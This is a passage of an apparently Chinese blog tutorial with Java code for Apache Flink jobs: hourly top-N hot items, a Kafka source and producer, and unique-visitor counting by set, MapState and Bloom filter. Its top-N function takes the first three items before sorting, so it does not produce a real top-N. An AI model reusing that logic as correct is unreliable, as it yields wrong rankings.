class="keyword">this</span>.behavior = behavior;</span><br><span class="line">        <span class="keyword">this</span>.timeStamp = timeStamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserBehavior&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;userId=&quot;</span> + userId +</span><br><span class="line">                <span class="string">&quot;, itemId=&quot;</span> + itemId +</span><br><span class="line">                <span class="string">&quot;, categoryId=&quot;</span> + categoryId +</span><br><span class="line">                <span class="string">&quot;, behavior=&#x27;&quot;</span> + behavior + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, timeStamp=&quot;</span> + timeStamp +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output structure</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItemViewCount</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> itemID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> windowEnd;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ItemViewCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ItemViewCount</span><span class="params">(<span class="keyword">long</span> itemID, <span class="keyword">long</span> windowEnd, <span class="keyword">long</span> count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.itemID = itemID;</span><br><span class="line">        <span class="keyword">this</span>.windowEnd = windowEnd;</span><br><span class="line">        <span class="keyword">this</span>.count = count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ItemViewCount&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;itemID=&quot;</span> + itemID +</span><br><span class="line">                <span class="string">&quot;, windowEnd=&quot;</span> + windowEnd +</span><br><span class="line">                <span class="string">&quot;, count=&quot;</span> + count +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotItems</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义流处理环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        <span class="comment">// 设置并行度</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 设置时间特征为事件事件</span></span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// source</span></span><br><span class="line">        <span class="comment">// input data</span></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transform</span></span><br><span class="line">        <span class="comment">// 将原始数据变成UserBehavior类型</span></span><br><span class="line">        SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, UserBehavior&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> UserBehavior <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(Long.parseLong(split[<span class="number">0</span>]), Long.parseLong(split[<span class="number">1</span>]), Integer.parseInt(split[<span class="number">2</span>]), split[<span class="number">3</span>], Long.parseLong(split[<span class="number">4</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 设置水印，处理乱序数据</span></span><br><span class="line">        <span class="comment">// 水印策略，有界无序，定义一个固定延迟事件</span></span><br><span class="line">        <span class="comment">// 同时时间的语义，由我们对象中的timeStamp指定</span></span><br><span class="line">        SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorWatermark = userBehaviorStream.assignTimestampsAndWatermarks(WatermarkStrategy</span><br><span class="line">                .&lt;UserBehavior&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                .withTimestampAssigner((event, timeStamp) -&gt; event.timeStamp * <span class="number">1000</span>));</span><br><span class="line">        <span class="comment">// 过滤出pv数据</span></span><br><span class="line">        userBehaviorWatermark.filter(<span class="keyword">new</span> FilterFunction&lt;UserBehavior&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(UserBehavior userBehavior)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> userBehavior.behavior.equals(<span class="string">&quot;pv&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">                <span class="comment">// 按照itemId聚合</span></span><br><span class="line">        .keyBy(value -&gt; value.itemId)</span><br><span class="line">        <span class="comment">// Windows can be defined on already partitioned KeyedStreams</span></span><br><span class="line">        <span class="comment">// 定义滑动窗口</span></span><br><span class="line">        .timeWindow(Time.hours(<span class="number">1</span>), Time.minutes(<span class="number">5</span>))</span><br><span class="line">        <span class="comment">// 统计出每种商品的个数，自定义聚合规则，和输出结构</span></span><br><span class="line">        .aggregate(<span class="keyword">new</span> CountAgg(), <span class="keyword">new</span> WindowResult())</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 按照每次窗口结束时间聚合</span></span><br><span class="line">        .keyBy(value-&gt;value.windowEnd)</span><br><span class="line">        <span class="comment">// 输出每个窗口中点击量前N名的商品</span></span><br><span class="line">        .process(<span class="keyword">new</span> TopNHotItems(<span class="number">3</span>))</span><br><span class="line">        .print(<span class="string">&quot;HotItems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">UserBehavior</span>,<span class="title">Long</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义初始值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组内规则</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(UserBehavior userBehavior, Long aLong)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> aLong+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long aLong)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> aLong;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组间规则</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long aLong, Long acc1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> aLong+acc1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WindowResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>,<span class="title">ItemViewCount</span>,<span class="title">Long</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Long aLong, TimeWindow timeWindow, java.lang.Iterable&lt;Long&gt; iterable, Collector&lt;ItemViewCount&gt; collector)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        collector.collect(<span class="keyword">new</span> ItemViewCount(aLong,timeWindow.getEnd(),iterable.iterator().next()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TopNHotItems</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>,<span class="title">ItemViewCount</span>,<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> n;</span><br><span class="line">    <span class="comment">// 定义一个状态变量 list state，用来保存所有的 ItemViewCont</span></span><br><span class="line">    <span class="keyword">public</span> ListState&lt;ItemViewCount&gt; itemState;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotItems</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// // 在执行processElement方法之前，会最先执行并且只执行一次 open 方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        itemState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;ItemViewCount&gt;(<span class="string">&quot;itemState&quot;</span>,ItemViewCount.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(ItemViewCount itemViewCount, Context context, Collector&lt;String&gt; collector)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        itemState.add(itemViewCount);</span><br><span class="line">        <span class="comment">// 注册 windowEnd+1 的 EventTime Timer, 延迟触发，当触发时，说明收齐了属于windowEnd窗口的所有商品数据，统一排序处理</span></span><br><span class="line">        context.timerService().registerEventTimeTimer(itemViewCount.windowEnd+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定时器触发时，会执行这个方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 已经收集到所有的数据，首先把所有的数据放到一个 List 中</span></span><br><span class="line">        List&lt;ItemViewCount&gt; allItems = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Iterable&lt;ItemViewCount&gt; itemViewCounts = itemState.get();</span><br><span class="line">        Iterator&lt;ItemViewCount&gt; iterator = itemViewCounts.iterator();</span><br><span class="line">        <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt&gt;=<span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">            allItems.add(iterator.next());</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 清除状态</span></span><br><span class="line">        itemState.clear();</span><br><span class="line">        <span class="comment">// 按照 count 大小  倒序排序</span></span><br><span class="line">        Collections.sort(allItems, <span class="keyword">new</span> Comparator&lt;ItemViewCount&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(ItemViewCount o1, ItemViewCount o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(o1.count&gt;o2.count) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(o1.count==o2.count) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        result.append(<span class="string">&quot;======================================================\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 触发定时器时，我们多设置了1秒的延迟，这里我们将时间减去0.1获取到最精确的时间</span></span><br><span class="line">        result.append(<span class="string">&quot;时间：&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(ItemViewCount elem:allItems) result.append(elem.toString());</span><br><span class="line">        result.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        result.append(<span class="string">&quot;======================================================\n&quot;</span>);</span><br><span class="line">        out.collect(result.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一个模块的代码，写得比较详细，之后的模块在文中就只写核心部分了。</p>
<h4 id="数据源改为kafka"><a href="#数据源改为kafka" class="headerlink" title="数据源改为kafka"></a>数据源改为kafka</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>,<span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;consumer-group&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;auto.offset.reset&quot;</span>, <span class="string">&quot;latest&quot;</span>);</span><br><span class="line">DataStreamSource&lt;String&gt; stringDataStreamSource = env.addSource(<span class="keyword">new</span> FlinkKafkaConsumer&lt;&gt;(<span class="string">&quot;hotItem&quot;</span>, <span class="keyword">new</span> SimpleStringSchema(), properties));</span><br></pre></td></tr></table></figure>

<h4 id="自定义kafka生产者"><a href="#自定义kafka生产者" class="headerlink" title="自定义kafka生产者"></a>自定义kafka生产者</h4><p>可以从文件读取信息并不断发送，便于测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">myKafkaProducer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        write2kafka(<span class="string">&quot;hotItem&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write2kafka</span><span class="params">(String topic)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>,<span class="string">&quot;192.168.166.200:9092&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> KafkaProducer&lt;String,String&gt;(properties);</span><br><span class="line">        InputStreamReader read = <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;data/UserBehavior.csv&quot;</span>));</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(read);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            String s = bufferedReader.readLine();</span><br><span class="line">            <span class="keyword">if</span>(s!=<span class="keyword">null</span>) &#123;</span><br><span class="line">                producer.send(<span class="keyword">new</span> ProducerRecord&lt;String, String&gt;(topic,s));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="实时流量统计"><a href="#实时流量统计" class="headerlink" title="实时流量统计"></a>实时流量统计</h3><h4 id="页面浏览量统计"><a href="#页面浏览量统计" class="headerlink" title="页面浏览量统计"></a>页面浏览量统计</h4><p>每隔5秒，输出最近10分钟内访问量最多的前N个URL。</p>
<p>套路其实是一样的，就当作复习重新写一遍就可以了，这里就不贴代码了。</p>
<h4 id="网站浏览总量-PV"><a href="#网站浏览总量-PV" class="headerlink" title="网站浏览总量(PV)"></a>网站浏览总量(PV)</h4><p>统计每小时pv</p>
<p>其实就是一个word count，代码也不贴了，都在仓库里。</p>
<h4 id="独立访客数统计-UV"><a href="#独立访客数统计-UV" class="headerlink" title="独立访客数统计(UV)"></a>独立访客数统计(UV)</h4><p>这里涉及到一个去重的操作，flink本身没有distinct算子，这比较出乎意料，当前场景，有如下几种去重的方式。</p>
<p>在展示去重方法之前，需要先指出一个api的要点，就是WindowedStream/AllWindowedStream，这两者最后输出的都是DataStream，可以apply在有分区和没分区的窗口中，效果虽然没有process这么强力，但还是不错的。</p>
<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>利用set进行去重</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UniqueVisitor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/UserBehavior.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, UserBehavior&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> UserBehavior <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(Long.parseLong(split[<span class="number">0</span>]), Long.parseLong(split[<span class="number">1</span>]), Integer.parseInt(split[<span class="number">2</span>]), split[<span class="number">3</span>], Long.parseLong(split[<span class="number">4</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorWatermark = userBehaviorStream.assignTimestampsAndWatermarks(WatermarkStrategy</span><br><span class="line">                .&lt;UserBehavior&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                .withTimestampAssigner((event, timeStamp) -&gt; event.timeStamp * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        userBehaviorWatermark.filter(value -&gt; value.behavior.equals(<span class="string">&quot;pv&quot;</span>))</span><br><span class="line">                .timeWindowAll(Time.minutes(<span class="number">60</span>))</span><br><span class="line">                .apply(<span class="keyword">new</span> UvCountByWindow())</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UvCountByWindow</span> <span class="keyword">implements</span> <span class="title">AllWindowFunction</span>&lt;<span class="title">UserBehavior</span>,<span class="title">UVCount</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(TimeWindow window, Iterable&lt;UserBehavior&gt; input, Collector&lt;UVCount&gt; out)</span> </span>&#123;</span><br><span class="line">        Set&lt;Long&gt; longs = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (UserBehavior next : input) &#123;</span><br><span class="line">            longs.add(next.userId);</span><br><span class="line">        &#125;</span><br><span class="line">        out.collect(<span class="keyword">new</span> UVCount(window.getEnd(),longs.size()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>利用mapState，思路和set差不多</p>
<p>可以看到这个processFunction并没有ontimer方法，因为keyedProcessFunction是ProcessFunction的扩展，可以在onTimer获取timer的key (通过context.getCurrentKey方法)，而这个方法并不是。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UniqueVisitor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/UserBehavior.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, UserBehavior&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> UserBehavior <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(Long.parseLong(split[<span class="number">0</span>]), Long.parseLong(split[<span class="number">1</span>]), Integer.parseInt(split[<span class="number">2</span>]), split[<span class="number">3</span>], Long.parseLong(split[<span class="number">4</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorWatermark = userBehaviorStream.assignTimestampsAndWatermarks(WatermarkStrategy</span><br><span class="line">                .&lt;UserBehavior&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                .withTimestampAssigner((event, timeStamp) -&gt; event.timeStamp * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        userBehaviorWatermark.filter(value -&gt; value.behavior.equals(<span class="string">&quot;pv&quot;</span>))</span><br><span class="line">                .timeWindowAll(Time.minutes(<span class="number">60</span>))</span><br><span class="line"><span class="comment">//                .apply(new UvCountByWindow())</span></span><br><span class="line">                .process(<span class="keyword">new</span> UvCountByProcess())</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UvCountByProcess</span> <span class="keyword">extends</span> <span class="title">ProcessAllWindowFunction</span>&lt;<span class="title">UserBehavior</span>, <span class="title">UVCount</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MapState&lt;Long, Long&gt; mapState;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        mapState = getRuntimeContext().getMapState(<span class="keyword">new</span> MapStateDescriptor&lt;&gt;(<span class="string">&quot;mapState&quot;</span>,Long.class , Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Context context, Iterable&lt;UserBehavior&gt; iterable, Collector&lt;UVCount&gt; collector)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(UserBehavior elem:iterable) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!mapState.contains(elem.userId)) &#123;</span><br><span class="line">                mapState.put(elem.userId,<span class="number">1L</span>);</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        collector.collect(<span class="keyword">new</span> UVCount(context.window().getEnd(),cnt));</span><br><span class="line">        mapState.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="方法三-布隆过滤"><a href="#方法三-布隆过滤" class="headerlink" title="方法三 布隆过滤"></a>方法三 布隆过滤</h5><p>上两种方法都需要用到内存在存储元素，要是数据量很大，会遇到资源不够的情况，这里采用布隆过滤器。</p>
<p>这里有用到trigger触发器这个api，需要简单了解的，可以去这篇文章，<a href="https://woaixiaoyuyu.github.io/2021/07/24/Flink%20trigger/#more">链接</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UvWithBloomFilter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/UserBehavior.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, UserBehavior&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> UserBehavior <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] split = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(Long.parseLong(split[<span class="number">0</span>]), Long.parseLong(split[<span class="number">1</span>]), Integer.parseInt(split[<span class="number">2</span>]), split[<span class="number">3</span>], Long.parseLong(split[<span class="number">4</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;UserBehavior&gt; userBehaviorWatermark = userBehaviorStream.assignTimestampsAndWatermarks(WatermarkStrategy</span><br><span class="line">                